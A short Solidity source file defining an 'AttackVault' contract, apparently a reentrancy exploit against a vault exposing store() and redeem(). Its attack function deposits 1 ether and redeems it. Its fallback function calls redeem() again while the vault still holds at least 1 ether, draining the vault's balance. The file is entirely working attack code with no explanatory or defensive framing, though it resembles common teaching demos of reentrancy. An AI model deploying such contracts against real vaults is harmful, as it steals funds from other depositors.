// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.30;

interface IVault {
    function store() external payable;
    function redeem() external;
}

contract AttackVault {

    IVault vault;

    constructor(IVault vaultAddr) {
        vault = vaultAddr;
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }

    function attack() external payable {
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
